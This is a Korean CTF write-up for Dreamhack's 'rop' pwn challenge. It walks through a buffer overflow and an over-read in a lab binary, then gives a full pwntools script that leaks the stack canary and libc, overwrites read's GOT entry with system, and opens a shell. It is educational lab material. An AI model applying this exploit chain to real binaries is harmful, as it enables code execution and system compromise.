# rop - Dreamhack
## Challenge Info
- Date: 2025
- CTF Name: Dreamhack
- Category: pwn
- Difficulty (subjective): easy
- Points: 2
- Provided Files: rop.c, rop(ELF)
- tools: gdb(pwndbg), checksec, ROPgadget
## Brief Description
Exploit Tech: Return Oriented Programming에서 실습하는 문제입니다.
## Initial Analysis
### Environment
``` sh
checksec --file=rop
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```
### Code
``` c
// Name: rop.c
// Compile: gcc -o rop rop.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Leak canary
  puts("[1] Leak Canary");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Do ROP
  puts("[2] Input ROP payload");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);

  return 0;
}
```
Return to Libc 문제와는 다르게 이번 문제는 get_shell 함수를 제공하지 않는다.  
## Vulnerability
### BOF(Buffer Overflow)
``` c
// buf size: 0x30
read(0, buf, 0x100);
```
`buf`의 크기는 0x30인 반면, `read`로 읽어오는 `buf`의 길이는 0x100로 크게 벗어나 BOF 취약점이 발생한다. 해당 취약점은 총 2번 발생한다. 
### OOB(Out Of Bounds)
``` c
printf("Buf: %s\n", buf);
```
`NULL-byte`가 나오기 전까지 계속 일오기 때문에, `buf`의 크기를 넘어서는 상위 데이터를 읽어올 수 있는 OOB 취약점이 발생한다.  
## Exploit
### Strategy
get_shell 함수를 제공하지 않기 때문에 직접 `system` 함수를 호출해야 한다. PIE 비활성화와 함께 BOF, OOB 취약점이 있는 환경 덕분에 GOT 및 canary를 leak하고 덮어쓸 수 있다. 다음은 ROP 공격에 필요한 요소들을 정리한 것이다.  
| 정보 | 역할 | 확보 방법 |
| --- | --- | --- |
| system_PLT | system 호출 | pwndbg> plt |
| "/bin/sh" | system 함수 인자 | ROP 삽입 |
| pop_rdi | system 인자를 레지스터에 전달 | ROPgadget --binary ./rtl --re "pop rdi" |
| pop_rsi | read 인자를 레지스터에 전달 | ROPgadget --binary ./rtl --re "pop rsi" |
| pop_rdx | read 인자를 레지스터에 전달 | ROPgadget --binary ./rtl --re "pop rdx" |
| ret | 스택 정렬 | ROPgadget --binary=./rtl \| grep ": ret" |
| libc base | system addr 확인 | libc leak |

``` sh
$ readelf -s libc.so.6 | grep " read@"
   289: 0000000000114980   157 FUNC    GLOBAL DEFAULT   15 read@@GLIBC_2.2.5
$ readelf -s libc.so.6 | grep " system@"
  1481: 0000000000050d60    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
```
### Stack Frame of main
| Variable Name | Offset from EBP |
| --- | --- |
| ra | 0x8 |
| rbp |  |
| canary | -0x8 |
| dummy | -0x10 |
| buf | -0x40 |
### payload
``` python
#!/usr/bin/env python3
# Name: rop.py
from pwn import *

def slog(name, addr): return success(': '.join([name, hex(addr)]))

p = process('./rop')
# p = process('./rop', env= {"LD_PRELOAD" : "./libc.so.6"})
# 우분투를 최근에 설치한 경우, 문제에서 제공하는 libc 파일이 우분투 환경에서 사용하는 것과 미세하게 다를 수 있다. 이 경우 7번 라인을 주석처리하고 8번 라인을 해제하여 사용하는 libc 파일을 강제로 이 문제에서 제공하는 것으로 지정할 수 있다.
e = ELF('./rop')
libc = ELF('./libc.so.6')

# [1] Leak canary
buf = b'A'*0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)

# [2] Exploit
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
pop_rdi = 0x0000000000400853
pop_rsi_r15 = 0x0000000000400851
ret = 0x0000000000400854

payload = b'A'*0x38 + p64(cnry) + b'B'*0x8

# write(1, read_got, ...) 
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

# read(0, read_got, ...) 
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got + 0x8) # "/bin/sh" addr
payload += p64(ret)
payload += p64(read_plt)

p.sendafter(b'Buf: ', payload)
read = u64(p.recvn(6) + b'\x00'*2)
lb = read - libc.symbols['read'] # libc base
system = lb + libc.symbols['system']
slog('read', read)
slog('libc_base', lb)
slog('system', system)

p.send(p64(system) + b'/bin/sh\x00') # ROP read

p.interactive()
```